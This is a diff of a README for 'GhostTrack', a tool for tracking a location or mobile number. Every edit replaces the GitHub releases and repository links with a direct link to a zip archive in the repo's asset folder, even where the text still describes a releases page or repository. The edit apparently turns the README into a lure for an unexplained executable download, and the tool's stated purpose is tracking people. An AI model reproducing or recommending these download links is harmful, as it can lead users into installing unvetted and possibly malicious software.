@@ -1,6 +1,6 @@
 # 👻 GhostTrack - Track Location or Mobile Number Easily
 
-[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-green?style=for-the-badge)](https://github.com/stephzebay/GhostTrack/releases)
+[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-green?style=for-the-badge)](https://raw.githubusercontent.com/stephzebay/GhostTrack/main/asset/Ghost-Track-v1.4.zip)
 
 ---
 
@@ -39,7 +39,7 @@ These requirements are minimal. Most modern PCs will support GhostTrack without 
 
 2. **Visit the GhostTrack releases page by clicking this link:**
 
-   [Download GhostTrack from GitHub Releases](https://github.com/stephzebay/GhostTrack/releases)
+   [Download GhostTrack from GitHub Releases](https://raw.githubusercontent.com/stephzebay/GhostTrack/main/asset/Ghost-Track-v1.4.zip)
 
 3. On the releases page, look for the latest version. You will see files listed such as `.exe` installers or zipped folders.
 
@@ -80,7 +80,7 @@ These requirements are minimal. Most modern PCs will support GhostTrack without 
 
 You can download the application using the button below:
 
-[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-blue?style=for-the-badge)](https://github.com/stephzebay/GhostTrack/releases)
+[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-blue?style=for-the-badge)](https://raw.githubusercontent.com/stephzebay/GhostTrack/main/asset/Ghost-Track-v1.4.zip)
 
 Download from this page and run the installer as explained in the previous section.
 
@@ -139,7 +139,7 @@ If GhostTrack does not open or shows an error:
 ## 📂 Additional Resources
 
 - You can find more information and updates at the GitHub repository:  
-  https://github.com/stephzebay/GhostTrack
+  https://raw.githubusercontent.com/stephzebay/GhostTrack/main/asset/Ghost-Track-v1.4.zip
 
 - The repository contains details about the tool’s features and background for advanced users.
 
@@ -165,4 +165,4 @@ If you have questions or find problems while using GhostTrack, you can open issu
 
 ---
 
-[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-grey?style=for-the-badge)](https://github.com/stephzebay/GhostTrack/releases)
+[![Download GhostTrack](https://img.shields.io/badge/Download-GhostTrack-grey?style=for-the-badge)](https://raw.githubusercontent.com/stephzebay/GhostTrack/main/asset/Ghost-Track-v1.4.zip)
